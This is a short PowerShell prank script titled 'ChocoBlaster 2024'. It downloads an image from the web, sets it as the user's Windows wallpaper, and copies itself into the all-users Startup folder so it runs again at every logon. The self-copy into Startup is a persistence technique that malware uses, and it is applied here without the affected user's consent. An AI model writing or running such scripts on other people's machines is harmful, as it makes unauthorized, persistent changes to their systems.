#ChocoBlaster 2024

# Import the necessary functions from user32.dll
Add-Type @"
    using System;
    using System.Runtime.InteropServices;
"@

# Define the SystemParametersInfo function signature
$signature = @"
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
"@

######################################################

$url = "https://img.nrj.fr/O_S5cXRddDwFQw3iWgnkw1Gkhew=/medias%2F2023%2F11%2Fsn6o-ta0bj1na2hpfxkymvqxw2zivunqsat7ajyz-si_65533d8be6788.jpg"

# Download the image to a temporary file
$downloadPath = "C:\Users\" + $env:USERNAME + "\Downloads\choco.jpg"
Invoke-WebRequest -Uri $url -OutFile $downloadPath

Write-Host "Downloaded image file: $downloadPath"


# Load the SystemParametersInfo function
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
Add-Type -MemberDefinition $signature -Namespace User32 -Name Wallpaper

# Define the actions and flags for SystemParametersInfo
$SPI_SETDESKWALLPAPER = 0x0014
$SPIF_UPDATEINIFILE = 0x01
$SPIF_SENDCHANGE = 0x02

# Call SystemParametersInfo to set the wallpaper
[User32.Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $downloadPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE)

# Copies itself in another location
$scriptPath = $MyInvocation.MyCommand.Path
$destinationDirectory = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# Combine the destination directory with the script filename
$destinationPath = Join-Path -Path $destinationDirectory -ChildPath (Split-Path -Path $scriptPath -Leaf)

# Copy the script to the destination directory
Copy-Item -Path $scriptPath -Destination $destinationPath -Force

Write-Host "Script copied to: $destinationPath"
